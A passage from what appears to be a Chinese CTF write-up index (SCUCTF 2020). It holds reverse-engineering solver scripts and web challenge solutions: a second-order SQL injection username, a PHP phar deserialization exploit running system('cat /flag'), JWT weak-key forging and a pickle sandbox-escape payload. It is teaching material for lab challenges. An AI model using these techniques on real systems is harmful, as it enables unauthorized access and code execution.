\u4ea4\u6613"},{"location":"WriteUp/202005/Reverse/#_7","text":"\u8fd9\u4e2a\u9898\u76ee\u51fa\u9898\u4e3b\u8981\u60f3\u8003\u5bdf\u4e00\u4e0bpython\u7684\u9006\u5411\uff0c\u6821\u5185\u6253\u6821\u5916\u6bd4\u8d5b\u7684\u4e0d\u591a\uff0c\u89c1\u5f97\u9898\u76ee\u76f8\u5bf9\u8f83\u5c11\u3002\u6240\u4ee5\u672c\u7740\u62d3\u5bbd\u5b66\u4e60\u7684\u76ee\u7684\uff0c\u51fa\u4e86\u8fd9\u9053\u8fd8\u539f\u5b57\u8282\u7801\u7684\u9898\u76ee\u3002\u76f8\u5bf9\u6765\u8bf4\u8fd9\u9053\u9898\u4e0d\u662f\u592a\u96be\uff0c\u901a\u8fc7\u76f8\u5173\u535a\u5ba2\u641c\u7d22\uff0c\u7136\u540e\u4e00\u6b65\u6b65\u5206\u6790\u8fd8\u539f\uff0c\u8fd8\u539f\u540edis\u68c0\u9a8c\u3002 \u53c2\u8003\u6587\u7ae0 https://bbs.pediy.com/thread-246683.htm","title":"\u51fa\u9898\u601d\u8def"},{"location":"WriteUp/202005/Reverse/#_8","text":"\u9996\u5148\u76f4\u63a5\u8fd8\u539fpython\u4ee3\u7801\u5c31\u597d\u4e86\uff0c\u8fd8\u539f\u7ed3\u679c\u5982\u4e0b inputs = input ( \"please your flag:\" ) inputs = inputs [ 7 : - 1 ] flag = \"th31_scuctf_eXclus1v3\" theflag = \"\" i = 0 j = 0 print ( flag [ 0 ]) if ( len ( flag ) != len ( inputs )): print ( \"Error!\" ) for i in range ( 0 , len ( flag ) - 14 ): theflag += ( chr ( ord ( flag [ i ]) + ord ( inputs [ i + 8 ]))) for i in range ( 10 , len ( flag ) - 6 ): theflag += ( chr ( ord ( flag [ i ]) + ord ( inputs [ i - 8 ]))) j = i + 1 for i in range ( j , len ( flag )): theflag += ( chr ( ord ( flag [ i - 3 ]) + ord ( inputs [ i ]))) flags = list ( theflag ) for i in range ( 0 , len ( flags ) // 2 ): flags [ i ] = chr ( ord ( flags [ i ]) + 20 ) #Flag scuctf{} #The flag text starts with \"d1\" and the eighth bit is \"3\" flagt = flags [ len ( flags ) // 2 : len ( flags )] theflag = \"\" . join ( flagt ) for k in range ( 0 , len ( flags ) // 2 ): theflag += \"\" . join ( flags [ k ]) if ( theflag == '\u00d7 \\x8b \u00d9\u00cd \\x8c \u00d3\u00dc\u00ee\u00a4\u00fa\u00b1\u00ac\u00a4\u00a4\u00fa\u00d6\u00ed\u00d2' ): print ( \"You win!\" ) else : print ( \"Error!!!\" ) \u63a5\u7740\u5c31\u662f\u9006\u5411\u5206\u6790\uff0c\u5199\u89e3\u9898\u811a\u672c","title":"\u89e3\u9898\u65b9\u6cd5"},{"location":"WriteUp/202005/Reverse/#1_1","text":"enflag = '\u00d7 \\x8b \u00d9\u00cd \\x8c \u00d3\u00dc\u00ee\u00a4\u00fa\u00b1\u00ac\u00a4\u00a4\u00fa\u00d6\u00ed\u00d2' flag = 'th31_scuctf_eXclus1v3' ans = 'd1' + '*' * 19 step1 = enflag [ 9 :] + enflag [ 0 : 9 ] theflag = '' for i in range ( 0 , 9 ): theflag += chr ( ord ( step1 [ i ]) - 20 ) theflag += step1 [ 9 :] inputs = list ( ans ) for i in range ( 0 , 7 ): inputs [ i + 8 ] = chr ( ord ( theflag [ i ]) - ord ( flag [ i ])) for i in range ( 10 , 15 ): inputs [ i - 8 ] = chr ( ord ( theflag [ i - 3 ]) - ord ( flag [ i ])) for i in range ( 15 , 21 ): inputs [ i ] = chr ( ord ( theflag [ i - 3 ]) - ord ( flag [ i - 3 ])) inputs [ 7 ] = '3' print ( 'scuctf{' + '' . join ( inputs ) + '}' )","title":"\u6cd51"},{"location":"WriteUp/202005/Reverse/#2_1","text":"from z3 import * flag = \"th31_scuctf_eXclus1v3\" dist = \"\u00d7\u008b\u00d9\u00cd\u008c\u00d3\u00dc\u00ee\u00a4\u00fa\u00b1\u00ac\u00a4\u00a4\u00fa\u00d6\u00ed\u00d2\" inp = [ BitVec (( 'x %s ' % i ), 8 ) for i in range ( len ( flag ))] theflag = [] for i in range ( 0 , len ( flag ) - 14 ): theflag . append ( ord ( flag [ i ]) + inp [ i + 8 ]) for i in range ( 10 , len ( flag ) - 6 ): theflag . append ( ord ( flag [ i ]) + inp [ i - 8 ]) for i in range ( len ( flag ) - 6 , len ( flag )): theflag . append ( ord ( flag [ i - 3 ]) + inp [ i ]) flags = [ _ for _ in theflag ] for i in range ( len ( flags ) // 2 ): flags [ i ] = flags [ i ] + 20 theflag = theflag [ len ( flags ) // 2 :] for i in range ( len ( flags ) // 2 ): theflag . append ( flags [ i ]) solver = Solver () for i in zip ( theflag , dist ): solver . append ( i [ 0 ] == ord ( i [ 1 ])) solver . check () model = solver . model () for i , v in enumerate ( inp ): try : print ( chr ( model [ v ] . as_long ()), end = '' ) except : print ( ' ' , end = '' ) \u9898\u76ee\u524d\u4e24\u4f4d\u548c\u7b2c\u516b\u4f4d\u65e0\u6cd5\u89e3\u9664\uff0c\u9898\u76ee\u4e2d\u5df2\u7ecf\u63d0\u793a\u5177\u4f53\u5b57\u7b26","title":"\u6cd52"},{"location":"WriteUp/202005/Reverse/#onibase64","text":"","title":"ONIbase64"},{"location":"WriteUp/202005/Reverse/#_9","text":"\u672c\u9053\u9898\u4e3b\u8981\u5c31\u662f\u8003\u5bdf\u4e00\u4e2aollvm\u5e73\u5766\u5316\u3002\u4e5f\u6ca1\u60f3\u5230\u8fd9\u4e48\u60e8\u70c8\u3002","title":"\u51fa\u9898\u601d\u8def"},{"location":"WriteUp/202005/Reverse/#_10","text":"\u6587\u4ef6\u62c9\u5230\u6700\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u7f16\u8bd1\u5668\u5730\u5740\uff0c\u76f4\u63a5\u628a\u5b83pull\u4e0b\u6765\uff0c\u7f16\u8bd1.s\u6587\u4ef6\u5f97\u5230\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u62d6\u5165IDA\u5206\u6790\uff0c\u662f\u4e2a\u6807\u51c6\u7684\u5e73\u5766\u5316\u3002 \u53c2\u8003 https://github.com/pcy190/deflat \u53bb\u9664\u5e73\u5766\u5316 \u7136\u540e\u76f4\u63a5F5\u5199\u89e3\u5bc6\u811a\u672c from z3 import * from functools import reduce table = 'ZAnUX1W2oPNQ4sBMOd/+ChfGI5r8Hvt3uaLkbDgcyJYTipez6mxF0SEqRjVKwl97' coding = '5auRs6a4A2lEUObG5+uoPGuWHnimZLXtvkyEHxCFoal5' dist = map ( lambda x : BitVecVal ( table . find ( x ), 6 ), coding ) flag = [ BitVec ( 'c %d ' % i , 8 ) for i in range ( 32 )] total = Concat ( flag ) s = [ Extract ( 32 * ( i + 1 ) - 1 , 32 * i , total ) for i in range ( 8 )] temps = reduce ( lambda x , y : x ^ y , s , 0 ) s = [ i ^ temps for i in s ] s . reverse () total = Concat ( s ) bits = [ Extract ( 8 * ( i + 1 ) - 1 , 8 * i , total ) for i in range ( 32 )] bits = bits + [ reduce ( lambda x , y : x ^ y , bits )] tup = [ bits [ i : i + 3 ] for i in range ( 0 , len ( bits ), 3 )] outs = [] padding = BitVecVal ( 0 , 2 ) for i , v in enumerate ( tup ): t = Concat ( v ) s1 = Extract ( 23 , 18 , t ) s2 = Extract ( 17 , 12 , t ) s3 = Extract ( 11 , 6 , t ) s4 = Extract ( 5 , 0 , t ) outs . append ( s1 ) outs . append ( s2 ) outs . append ( s3 ) outs . append ( s4 ) for v2 in tup [ i + 1 :]: v2 [ 0 ] = v2 [ 0 ] ^ Concat ( padding , s1 ) v2 [ 1 ] = v2 [ 1 ] ^ Concat ( padding , s2 ) v2 [ 2 ] = v2 [ 2 ] ^ Concat ( padding , s3 ) solve = Solver () for i , v in enumerate ( dist ): solve . add ( outs [ i ] == v ) solve . check () model = solve . model () print ( '' . join ( map ( lambda x : chr ( model . eval ( x , 8 ) . as_long ()), reversed ( flag ))))","title":"\u89e3\u9898\u65b9\u6cd5"},{"location":"WriteUp/202005/Reverse/#easy_reeasy_base","text":"","title":"easy_re&amp;easy_base"},{"location":"WriteUp/202005/Reverse/#_11","text":"\u65e2\u7136\u8981\u641e\u82b1\u6837\uff0c\u5f53\u7136\u5c11\u4e0d\u5f53\u4eca\u6700\u706b\u7684iot\u3002\u91c7\u7528\u817e\u8bafTencentOS tiny \u5b98\u65b9\u5b9a\u5236IoT\u5f00\u53d1\u677fEVB_LX(\u6682\u65f6\u662f\u9650\u91cf\u7684)\u7f16\u8bd1\u73af\u5883\uff1a https://github.com/Tencent/TencentOS-tiny \u4e24\u4e2a\u9898\u76ee\uff0c\u90fd\u662f\u8003\u5bdf\u627e\u5230\u88ab\u66ff\u6362\u7684base64\u5bc6\u7801\u8868\uff0c\u7531\u4e8e\u8003\u8651\u5230\u76f4\u63a5\u4e0abase\u6709\u70b9\u96be\uff0c\u6240\u4ee5\u51fa\u4e86\u4e00\u4e2aeasy_re\u8fc7\u6e21\u3002 \u4e24\u4e2a\u9898\u76ee\u66ff\u6362\u90fd\u6d89\u53ca\u56db\u6bb5\u5b57\u7b26\u5982\u4e0b\uff08\u628a\u521d\u59cb\u5bc6\u7801\u8868\u62c6\u5206\u4e3a\u56db\u6bb5\uff09\uff1a \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" \"abcdefghijklmnopqrstuvwxyz\" \"0123456789\" \"+/\" easy_re\u662f\u6539\u53d8\u4e86\u8fd9\u56db\u6bb5\u5b57\u7b26\u538b\u6808\u987a\u5e8f\u3002\u6ca1\u60f3\u5230ida\u592a\u8fc7\u4e8e\u667a\u80fd\u5316\uff0c\u663e\u793a\u7ed3\u679c\u5373\u662f\u6b63\u786e\u538b\u6808\u987a\u5e8f\u3002 easy_base\u8003\u5bdf\u504f\u96be\u4e86\uff0c\u4e3b\u8981\u662f\u5bf9\u8fd9\u56db\u6bb5\u5b57\u7b26\u8fdb\u884c\u4e86\u4e00\u4e9b\u53d8\u6362\uff0c\u5982\u679c\u9006\u5411\u5206\u6790\u7684\u8bdd\u9700\u8981\u5b66\u4e60risc-v\u6307\u4ee4\u96c6\u3002 \u5f53\u7136\uff0c\u8fd9\u4e24\u4e2a\u9898\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u628a\u7a0b\u5e8f\u653e\u5165\u5bf9\u5e94\u5f00\u53d1\u677f\u91cc\uff0c\u4ed6\u76f8\u5e94\u7684\u4e32\u53e3\u4e5f\u4f1a\u8f93\u51fa\u5b57\u6bcd\u8868\u3002 \u505a\u9898\u8fc7\u7a0b\u4e2d\u4e5f\u53d1\u73b0\u4e00\u4e9b\u9009\u624b\u62ff\u5230\u9898\u76ee\u76f4\u63a5\u731c\u6d4barm\u67b6\u6784\uff0c\u62ff\u7740ida \u5f53arm\u5206\u6790\uff0c\u8fd8\u539f\u7684\u5185\u5bb9\u662f\u9519\u7684\uff0c\u65e0\u4ece\u4e0b\u624b\u3002\u5982\u679c\u62ff\u5230\u6587\u4ef6\u540eFile\u4e00\u4e0b\u4e5f\u4f1a\u77e5\u9053\u662frisc-v\u67b6\u6784\u3002\u4e0d\u81f3\u4e8e\u8d70\u504f\u3002","title":"\u51fa\u9898\u601d\u8def"},{"location":"WriteUp/202005/Reverse/#_12","text":"\u9996\u5148\uff0cida\u9ed8\u8ba4\u4e0d\u652f\u6301risc-v\uff0c\u6240\u4ee5\u9700\u8981\u4e0b\u8f7d\u76f8\u5173\u63d2\u4ef6\u3002 https://github.com/lcq2/riscv-ida \u7136\u540e\uff0cida\u6253\u5f00\u5206\u6790\uff0c\u76f4\u63a5\u5c31\u6709\u6b63\u786e\u7684\u5b57\u6bcd\u8868\u538b\u6808\u987a\u5e8f\uff0c\uff08\u539f\u672c\u662f\u60f3\u8ba9\u9009\u624b\u5206\u6790\u7b80\u5355\u6307\u4ee4\u6765\u786e\u5b9a\u6216\u8005\u7206\u7834\uff09 \u5f97\u5230 \u5b57\u6bcd\u8868\u5c31\u5f88\u5bb9\u6613\u89e3\u51fa\u6765\u4e86 import base64 str1 = \"PalXPrhnOrLZT6PVQJ1oNr9dSqDVTbo==\" string1 = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/abcdefghijklmnopqrstuvwxyz\" string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print ( base64 . b64decode ( str1 . translate ( str . maketrans ( string1 , string2 )))) easy_base \u7684\u8bdd\u5c31\u9700\u8981\u5206\u6790\u6307\u4ee4\u5f97\u51fa\u5177\u4f53\u64cd\u4f5c\u6216\u8005\u76f4\u63a5\u5f00\u53d1\u677f\u8dd1\u4e00\u4e0b\u5f97\u5230\u8f93\u51fa \u770b\u5230\u5927\u591a\u6570\u4eba\u89e3\u9898\u65e0\u679c\uff0c\u6bd4\u8d5b\u6700\u540e\u653e\u51fa\u4e86\u4e00\u4e2arisc-v 64\u4f4d\u7684\u9644\u4ef6\uff08\u4ee3\u7801\u4e00\u6837\uff09\uff0c\u901a\u8fc7docker\u8dd1\u5373\u53ef\u5f97\u5230table\u3002 \u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u5f97\u5230flag import base64 str1 = \"UoH+U/DJV/YlQdUOU94JPYxJgdHMUWK=\" string1 = \"a0b1c2d3e4f5g6h7i8j9ZYXWVUTSRQPON+klmnopqrABCDEFGHIJKLM/stuvwxyz\" string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print ( base64 . b64decode ( str1 . translate ( str . maketrans ( string1 , string2 )))) \u5982\u679c\u5bf9\u9898\u76ee\u611f\u5174\u8da3\u7684\uff0c\u53ef\u4ee5\u4e4b\u540e\u518d\u7814\u7a76\u3002\u6211\u9644\u4e0a\u9898\u76ee\u4e3b\u6587\u4ef6\u6e90\u4ee3\u7801 #include \"mcu_init.h\" #include \"tos_k.h\" #define TASK_SIZE 1024 k_task_t k_task_task1 ; k_task_t k_task_task2 ; uint8_t k_task1_stk [ TASK_SIZE ]; uint8_t k_task2_stk [ TASK_SIZE ]; int share = 0xCBA7F9 ; k_sem_t sem ; unsigned char * scuctf_flag_base64 = \"UoH+U/DJV/YlQdUOU94JPYxJgdHMUWK=\" ; unsigned char base64_right [ 65 ] = \"\" ; void scuctf_base64 ( void ) { unsigned char base64_1 [ 26 ] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" ; unsigned char base64_2 [ 26 ] = \"abcdefghijklmnopqrstuvwxyz\" ; unsigned char base64_3 [ 10 ] = \"0123456789\" ; unsigned char base64_4 [ 2 ] = \"+/\" ; int i = 0 , j = 0 , k = 0 , q = 25 , r = 10 , n = 0 ; for ( i = 0 ; i < 20 ;) { base64_right [ i ] = base64_2 [ j ]; j ++ ; base64_right [ i + 1 ] = base64_3 [ k ]; k ++ ; i += 2 ; } for ( i = 20 ; i < 33 ; i ++ ) { base64_right [ i ] = base64_1 [ q ]; q -- ; } for ( i = 33 ; i < 42 ; i ++ ) { if ( i == 33 ) { base64_right [ 33 ] = base64_4 [ 0 ]; } else { base64_right [ i ] = base64_2 [ r ]; r ++ ; } } for ( i = 42 ; i < 64 ; i ++ ) { if ( n < 13 ) { base64_right [ i ] = base64_1 [ n ]; n ++ ; } else { if ( i == 55 ) { base64_right [ i ] = base64_4 [ 1 ]; } else { base64_right [ i ] = base64_2 [ r ]; r ++ ; } } } } void task1 ( void * pdata ) { int task_cnt1 = 0 ; while ( 1 ) { printf ( \"welcome scuctf from %s cnt: %d \\n \" , __func__ , task_cnt1 ++ ); tos_sem_pend ( & sem , ~ 0U ); gpio_bit_write ( GPIOA , GPIO_PIN_7 , share % 2 ); } } void task2 ( void * pdata ) { int task_cnt2 = 0 ; scuctf_base64 (); while ( 1 ) { share ++ ; for ( int i = 0 ; i < 5 ; i ++ ) { printf ( \"Where is scuctf_base64? %s cnt: %08x \\n %s\" , __func__ , task_cnt2 -- , base64_right ); tos_task_delay ( 50 ); } tos_sem_post ( & sem ); } } void main ( void ) { board_init (); usart0_init ( 115200 ); tos_knl_init (); tos_task_create ( & k_task_task1 , \"task1\" , task1 , NULL , 3 , k_task1_stk , TASK_SIZE , 0 ); tos_task_create ( & k_task_task2 , \"task2\" , task2 , NULL , 3 , k_task2_stk , TASK_SIZE , 0 ); k_err_t err = tos_sem_create ( & sem , 1 ); if ( err != K_ERR_NONE ) { goto die ; } tos_knl_start (); die : while ( 1 ) { asm ( \"wfi;\" ); } } int _put_char ( int ch ) { usart_data_transmit ( USART0 , ( uint8_t ) ch ); while ( usart_flag_get ( USART0 , USART_FLAG_TBE ) == RESET ){ } return ch ; } \u53c2\u8003 https://github.com/riscv/riscv-isa-manual/releases","title":"\u89e3\u9898\u65b9\u6cd5"},{"location":"WriteUp/202005/Reverse/#_13","text":"\u7531\u4e8e\u662f\u666e\u901a\u6821\u8d5b\uff0c\u9898\u76ee\u4e5f\u6ca1\u51fa\u8fc7\u5206\u96be\uff0c\u4e2a\u4eba\u611f\u89c9\u96be\u4ee5\u628a\u63e1\u8fd8\u7b97\u53ef\u4ee5\u3002\u8fd9\u6b21\u9898\u76ee\u4e3b\u8981\u4e5f\u672c\u7740\u6253\u7834\u4f20\u7edfscuctf \u5e38\u89c4\u9898\u76ee\uff0c\u4e00\u4e22\u4e22\u5c0f\u5c0f\u7684\u521b\u65b0\u3002 .NET\uff0crisc-v\uff0collvm\uff0capk\uff0cpython\u7b49\u3002\u5373\u4f7f\u8fd9\u4e9b\u53ef\u80fd\u5728\u5168\u56fdctf\u4e2d\u662f\u5e38\u89c1\u9898\u76ee\uff0c\u4f46\u662f\u611f\u89c9\u6821\u5185\u8fd8\u662f\u51e0\u4e4e\u6ca1\u51fa\u7684\u3002\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4e5f\u53d1\u751f\u4e86\u5f88\u591a\u8da3\u5473\u4e1c\u897f\uff0c\u6bd4\u5982\u7b2c\u4e00\u9898\u4e00\u9898\u591a\u89e3\uff0cflag\u8bbe\u7f6e\u65f6\u5019\u591a\u52a0\u4e86\u7a7a\u683c\u5bfc\u81f4\u9009\u624b\u63d0\u4ea4\u62a5\u9519\u7b49\u597d\u591a\u95ee\u9898\u3002 \u603b\u4e4b\u5e0c\u671bscuctf\u8d8a\u6765\u8d8a\u6709\u8da3\uff0c\u53c2\u4e0e\u4eba\u6570\u8d8a\u6765\u8d8a\u591a\u5427\uff01","title":"\u5c0f\u7ed3"},{"location":"WriteUp/202005/Web/","text":"Web \u00b6 \u4e8c\u6b21\u6ce8\u5165 \u00b6 \u8fd9\u9053\u9898\u8003\u5bdf\u7684\u662f\u7b80\u5355\u7684\u4e8c\u6b21SQL\u6ce8\u5165\uff0c\u51fa\u9898\u58ec\u5e0c\u671b\u540c\u5b66\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u9053\u7b80\u5355\u7684\u4f8b\u9898\u521d\u6b65\u4e86\u89e3\u4e8c\u6b21SQL\u6ce8\u5165\u3002 \u672c\u9898\u7684\u9884\u671f\u5185\u5bb9\u8fd8\u5305\u542b\u4e86\u901a\u8fc7robots.txt\u4e2d\u7684\u5185\u5bb9\u62ff\u5230\u6e90\u7801\uff0c\u8fdb\u884c\u5ba1\u8ba1\uff0c\u4e0d\u8fc7\u4f3c\u4e4e\u51fa\u9898\u51fa\u7684\u592a\u7b80\u5355\u4e86\uff0c\u5927\u5bb6\u90fd\u6ca1\u7528\u5230\u3002\u3002\u3002 \u5728robots.txt\u91cc\u9762\u5305\u542b\u4e86\u5982\u4e0b\u5185\u5bb9 User-agent: * Disallow: /backup.zip \u4e0b\u8f7d\u4e0b\u6765\u5ba1\u8ba1\u53ef\u4ee5\u770b\u7684\u66f4\u660e\u767d\u4e00\u4e9b\u3002\u9996\u5148\u6ce8\u518c\u548c\u767b\u9646\u90fd\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u51fa\u9898\u58ec\u4e5f\u5c31\u63a0\u8fc7\u53bb\u4e0d\u8bb2\u4e86\uff0c\u76f4\u63a5\u770b\u4fee\u6539\u5bc6\u7801\u7684\u5730\u65b9\u5b58\u5728\u7684\u6f0f\u6d1e $x=$db->execute(\"update users set password=? where username='$username' \",['s',&$password]); \u8fd9\u91cc\u76f4\u63a5\u5c06 username\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\u4e86\uff0c\u800c\u8fd9\u4e2a username\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\u4e86\uff0c\u800c\u8fd9\u4e2a username\u662f\u5728\u6ce8\u518c\u65f6\u9009\u5b9a\u7684\uff0c\u56e0\u6b64\u60f3\u8981\u5b9e\u73b0\u6ce8\u5165\uff0c\u9700\u8981\u5728\u6ce8\u518c\u7684\u65f6\u5019\uff0c\u5c31\u76f4\u63a5\u8bbe\u5b9a\u7528\u6237\u540d\u4e3aadmin'-- -\u3002 \u8fd9\u6837\u4e00\u6765\uff0c\u767b\u9646\u4e0a\u53bb\u4fee\u6539\u5bc6\u7801\u7684\u65f6\u5019\uff0csql\u8bed\u53e5\u5c31\u6210\u4e86 update users set password =? where username = 'admin' -- -' (\u5176\u4e2d?\u6307\u7684\u662f\u88ab\u7ed1\u5b9a\u7684\u53c2\u6570\uff0c\u6211\u4eec\u65e0\u8bba\u5982\u4f55\u4fee\u6539\u5b83\u90fd\u4e0d\u4f1a\u6539\u53d8\u539f\u672c\u7684\u8bed\u4e49) \u800c\u8fd9\u4e2a\u8bed\u53e5\u4e2dusername\u540e\u9762\u5c31\u6210\u4e86admin' -- -',\u5728MySQL\u4e2d--[\u7a7a\u683c]\u662f\u6ce8\u91ca\u7b26\uff0c\u628aSQL\u8bed\u53e5\u540e\u9762\u6ce8\u91ca\u6389\u4e86\uff0c\u56e0\u6b64\u8fd9\u53e5\u8bdd\u76f8\u5f53\u4e8e\u4fee\u6539admin\u7684\u5bc6\u7801\u3002 \u56e0\u6b64\u5728\u4fee\u6539\u5bc6\u7801\u540e\u767b\u51fa\uff0c\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u5bc6\u7801\u767b\u9646admin\u8d26\u53f7\u83b7\u53d6flag\u4e86 \u53cd\u5e8f\u5217\u5316\uff1f \u00b6 \u76f8\u4fe1\u5927\u5bb6\u770b\u5230\u95ee\u53f7\u5e94\u8be5\u77e5\u9053\u8fd9\u9053\u9898\u4e3b\u8981\u8003\u7684\u4e0d\u662f\u53cd\u5e8f\u5217\u5316\u4e86\u5427\uff08\u4e0d\u4f1a\u771f\u6709\u4eba\u5728\u7ea0\u7ed3\u53cd\u5e8f\u5217\u5316\u5427\uff09 \u89e3\u9898\u65b9\u6cd5 \u00b6 \u5148\u89c2\u5bdf vulnerable.php \u554a\uff0c\u4e3b\u9875\u4e0a\u90fd\u63d0\u793a\u4e86\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u663e\u7136\u80fd\u5bfc\u81f4RCE\u7684\u7c7b\uff0c\u4e0b\u9762\u6709\u4e00\u4e2a file_exists \u51fd\u6570\uff0c\u4e0d\u4f1a\u6709\u4eba\u771f\u89c9\u5f97\u8fd9\u8fb9\u662f\u68c0\u67e5\u4e0a\u4f20\u6587\u4ef6\u662f\u5426\u6210\u529f\u5427\u3002 file_exists \u51fd\u6570\u518d\u68c0\u67e5phar\u5305\u7684\u65f6\u5019\u4f1a\u5c06\u5176\u89e3\u6790\uff0c\u5229\u7528\u8fd9\u70b9\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002 \u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u751f\u6210\u4e00\u4e2aphar\u5305\uff08\u5e26\u4e0agif\u6587\u4ef6\u5934\uff0c\u56e0\u4e3a\u4e0a\u4f20\u90a3\u8fb9\u4f1a\u68c0\u67e5\uff09\uff0c\u7136\u540e\u4fee\u6539\u540e\u7f00\u540d\u4e0a\u4f20\u5373\u53ef\uff0c\u7136\u540e\u4f7f\u7528phar\u534f\u8bae phar://upload/xxx.gif \u5373\u53ef\u62ff\u5230flag\u3002 <?php class Flag { private $code ; function __construct ( $my_code ) { $this -> code = $my_code ; } function __destruct () { eval ( $this -> code ); } } $phar = new Phar ( 'phar1.phar' ); $phar -> stopBuffering (); $phar -> setStub ( 'GIF89a' . '<?php __HALT_COMPILER();?>' ); $phar -> addFromString ( 'test.txt' , 'test' ); $object = new Flag ( \"system('cat /flag');\" ); $phar -> setMetadata ( $object ); $phar -> stopBuffering (); ezcode \u00b6 \u51fa\u9898\u601d\u8def \u00b6 \u8003\u5bdfJWT\u7206\u7834\u3001pickle\u53cd\u5e8f\u5217\u5316\u7684\u6c99\u7bb1\u9003\u9038\uff08\u53d8\u91cf\u7be1\u6539\uff09\u3002 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u8fdb\u5165\u9996\u9875\uff0c\u8df3\u8f6c\u81f3\u767b\u9646\u754c\u9762\uff0c\u8981\u6c42\u8f93\u5165token\u767b\u9646\u3002\u4e0b\u9762\u6709\u4e2a\u6ce8\u518c\uff0c\u5148\u968f\u4fbf\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2aJWT\u3002 \u4f7f\u7528\u8be5JWT\u767b\u9646\u8fdb\u53bb\uff0c\u63d0\u793a\u6ca1\u6709\u6743\u9650\u3002\u5c1d\u8bd5\u4ee5admin\u6ce8\u518c\u8d26\u53f7\uff0c\u5931\u8d25\u3002\u5f88\u660e\u663e\u662f\u8981\u4f2a\u9020admin\u8d26\u6237\u7684JWT\u3002 \u901a\u8fc7\u5bf9\u4e4b\u524d\u6ce8\u518c\u7684\u8d26\u53f7\u7684JWT\u8fdb\u884c\u5f31\u5bc6\u94a5\u7206\u7834\uff08\u76f4\u63a5\u7528top1000\u5c31\u80fd\u7206\u7834\u51fa\u6765\uff09\uff0c\u5f97\u5230\u52a0\u5bc6\u5bc6\u94a5\uff1a qwerty \uff0c\u4ece\u800c\u4f2a\u9020admin\u8d26\u6237\u7684JWT\u3002 \u4ee5admin\u767b\u9646\u540e\uff0c\u51fa\u73b0\u4e00\u4e2apickle\u5728\u7ebf\u5de5\u5177\uff0c\u67e5\u770b\u7f51\u9875\u6e90\u7801\uff0c\u6709\u6ce8\u91ca\uff1a want2know = xxx class RestrictedUnpickler ( pickle . Unpickler ): blacklist = { 'sys' , 'eval' , 'exec' , 'execfile' , 'compile' , 'open' , 'input' , '__import__' , 'exit' , 'getattr' } def find_class ( self , module , name ): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self . blacklist : return getattr ( builtins , name ) # Forbid everything else. raise pickle . UnpicklingError ( \"global ' %s . %s ' is forbidden\" % ( module , name )) def restricted_loads ( s ): return RestrictedUnpickler ( io . BytesIO ( s )) . load () ... pickle_data = request . form . get ( 'data' ) if pickle_data == None : return open ( 'templates/pickle.html' ) . read () try : pickle_data = base64 . b64decode ( pickle_data . encode ()) op_blackli = [ b 'R' ] for op in op_blackli : if op in pickle_data : return '\u6570\u636e\u975e\u6cd5\uff01' + op . decode () data = restricted_loads ( pickle_data ) except Exception : return \"\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6570\u636e\u683c\u5f0f\uff01\" try : secret = request . form . get ( 'secret' ) except Exception : return open ( 'templates/pickle.html' ) if want2know == secret : return flag else : return '\u6b22\u8fce\u4f7f\u7528HACHp1\u7684pickle\u6d4b\u8bd5\u5de5\u5177\uff01' else : return '\u6ca1\u6709\u6743\u9650\u67e5\u770b\uff01 \\n ' \u5f88\u660e\u663e\u662fpickle\u53cd\u5e8f\u5217\u5316\uff0c\u9650\u5236\u4e86 builtins \u6a21\u5757\uff0c\u7981\u6b62\u4e86 R \u6267\u884c\u51fd\u6570\uff0c\u5e76\u4e14\u9ed1\u540d\u5355\u9650\u5236\u4e86\u4e00\u4e9b\u654f\u611f\u5b50\u6a21\u5757\uff0c\u53ea\u8981 want2know==secret \u6b63\u786e\u5c31\u80fd\u5f97\u5230flag\uff0c\u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7 globals() \u6216 locals() \u5f97\u5230\u53d8\u91cf\u5217\u8868\uff0c\u901a\u8fc7 i \u6267\u884c\u51fd\u6570\uff0c\u4fee\u6539\u5217\u8868\u8fbe\u5230\u7be1\u6539\u53d8\u91cf\u7684\u76ee\u7684\uff0c\u4ece\u800c\u5f97\u5230flag\u3002\u4e00\u79cd\u53ef\u884c\u7684payload\uff1a b \"(ibuiltins \\n globals \\n p0 \\n 0g0 \\n S'want2know' \\n S'hachp1' \\n s.\" # \u6216 b \"(ibuiltins \\n locals \\n p0 \\n 0g0 \\n S'want2know' \\n S'hachp1' \\n s.\" \u63a8\u8350\u4f7f\u7528pker\uff1a glo_dic = INST ( 'builtins' , 'globals' ) glo_dic [ 'want2know' ] = 'hachp1' return # \u6216 glo_dic = INST ( 'builtins' , 'locals' ) glo_dic [ 'want2know' ] = 'hachp1' return \u975e\u9884\u671f \u00b6 \u7531\u4e8e\u672c\u4eba\u5fd8\u8bb0\u8fc7\u6ee4 __getattribute__ 